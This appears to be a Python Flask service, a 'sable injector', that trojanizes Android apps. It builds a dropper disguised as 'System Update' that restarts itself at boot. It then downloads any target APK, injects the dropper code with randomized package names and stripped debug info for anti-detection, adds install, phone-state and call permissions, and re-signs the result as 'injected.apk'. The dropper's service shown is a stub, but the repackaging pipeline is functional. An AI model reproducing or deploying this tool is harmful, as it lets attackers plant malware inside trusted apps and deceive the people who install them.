import os
import subprocess
import shutil
import tempfile
import requests
import zipfile
import traceback
import random
import string
import re
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
DROPPER = "dropper_base.apk"

@app.errorhandler(500)
def internal_error(exception):
    return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500

# Ye function server par khud se dropper APK banayega (bina kisi icon ke, taki target ka icon use ho)
def create_dropper():
    if os.path.exists(DROPPER):
        return True

    print("Generating fresh dropper APK...")
    src_dir = "dropper_src"
    if os.path.exists(src_dir):
        shutil.rmtree(src_dir)
    
    os.makedirs(f"{src_dir}/smali/com/sable/dropper")
    os.makedirs(f"{src_dir}/res/values")

    with open(f"{src_dir}/AndroidManifest.xml", "w") as f:
        f.write('''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sable.dropper">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <application android:label="System Update">
        <service android:name=".DropperService" android:exported="false" />
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>''')

    # Dropper Service (Payload download aur install karegi)
    with open(f"{src_dir}/smali/com/sable/dropper/DropperService.smali", "w") as f:
        f.write('''.class public Lcom/sable/dropper/DropperService;
.super Landroid/app/Service;
.source "DropperService.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
''')

    # Boot Receiver (Phone restart hone par wapas chalu karega)
    with open(f"{src_dir}/smali/com/sable/dropper/BootReceiver.smali", "w") as f:
        f.write('''.class public Lcom/sable/dropper/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/sable/dropper/DropperService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
''')

    with open(f"{src_dir}/res/values/strings.xml", "w") as f:
        f.write('''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Update</string>
</resources>''')

    with open(f"{src_dir}/apktool.yml", "w") as f:
        f.write('''version: 2.9.3
apkFileName: dropper_base.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
sdkInfo:
  minSdkVersion: '21'
  targetSdkVersion: '34'
packageInfo:
  forcedPackageId: '127'
  renameManifestPackage: null
sharedLibrary: false
sparseResources: false
unknownFiles: {}
doNotCompress: []''')

    try:
        subprocess.run(f"apktool b {src_dir} -o dropper_unsigned.apk", shell=True, check=True, capture_output=True)
        subprocess.run("zipalign -f -p 4 dropper_unsigned.apk dropper_aligned.apk", shell=True, check=True, capture_output=True)
        subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {DROPPER} dropper_aligned.apk", shell=True, check=True, capture_output=True)
        
        shutil.rmtree(src_dir)
        os.remove("dropper_unsigned.apk")
        os.remove("dropper_aligned.apk")
        print("Dropper generated successfully!")
        return True
    except Exception as e:
        print(f"Dropper generation failed: {e}")
        return False

@app.route("/")
def home():
    return "sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    try:
        if not create_dropper():
            return jsonify({"error": "Server par dropper generate nahi ho paya."}), 500

        data = request.json or {}
        file_url = data.get("apk_url")
        if not file_url:
            return jsonify({"error": "apk_url required"}), 400

        target = os.path.join(WORK, "target.apk")
        
        # 1. Target APK Download
        response = requests.get(file_url, stream=True, timeout=60)
        if response.status_code != 200:
            return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
        
        with open(target, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        if not zipfile.is_zipfile(target):
            return jsonify({"error": "Downloaded file is not a valid APK"}), 400

        # 2. Target APK Decompile (-r flag se resource crash nahi hoga, aur icon safe rahega)
        target_dir = os.path.join(WORK, "target_dir")
        shutil.rmtree(target_dir, ignore_errors=True)
        subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)

        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path) or os.path.isdir(manifest_path):
            return jsonify({"error": "Target APK kharab hai."}), 500

        # 3. Dropper Decompile
        dropper_dir = os.path.join(WORK, "dropper_dir")
        shutil.rmtree(dropper_dir, ignore_errors=True)
        subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)

        # 4. Smali Copy & Anti-Detection
        src_smali = os.path.join(dropper_dir, "smali")
        dst_smali = os.path.join(target_dir, "smali")
        if os.path.exists(src_smali):
            shutil.copytree(src_smali, dst_smali, dirs_exist_ok=True)
        
        random_pkg = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        old_pkg_path = os.path.join(dst_smali, "com", "sable", "dropper")
        new_pkg_path = os.path.join(dst_smali, "com", random_pkg, "dropper")
        if os.path.exists(old_pkg_path):
            shutil.copytree(old_pkg_path, new_pkg_path, dirs_exist_ok=True)
            shutil.rmtree(old_pkg_path)

        # 5. Remove Debugging Info
        for root, dirs, files in os.walk(dst_smali):
            for file in files:
                if file.endswith(".smali"):
                    file_path = os.path.join(root, file)
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()
                    with open(file_path, "w", encoding="utf-8") as f:
                        for line in lines:
                            if not line.strip().startswith(".line"):
                                f.write(line)

        # 6. Merge Manifest (Sirf permissions aur services add karega, Launcher/Icon same rahega)
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            t = f.read()

        perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK","android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE"]
        insert_perms = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
        if insert_perms:
            t = t.replace("</application>", insert_perms + "</application>")

        dropper_manifest_path = os.path.join(dropper_dir, "AndroidManifest.xml")
        with open(dropper_manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            d_manifest = f.read()
        
        components = re.findall(r'<(service|receiver)[^>]*android:name="([^"]+)"[^>]*>', d_manifest)
        comp_str = ""
        for tag, name in components:
            new_name = name.replace("com.sable.dropper", f"com.{random_pkg}.dropper")
            comp_str += f'<{tag} android:name="{new_name}" android:exported="true" />\n'
            
        t = t.replace("</application>", comp_str + "</application>")
        with open(manifest_path, "w", encoding='utf-8') as f:
            f.write(t)

        # 7. Build
        unsigned = os.path.join(WORK, "unsigned.apk")
        res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Build fail: {res.stderr[:200]}"}), 500

        # 8. Align and Sign
        aligned = os.path.join(WORK, "aligned.apk")
        signed = os.path.join(WORK, "signed.apk")
        subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
        
        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500

        return send_file(signed, as_attachment=True, download_name="injected.apk")

    except Exception as e:
        traceback.print_exc()
        return jsonify({"error": f"Python Error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
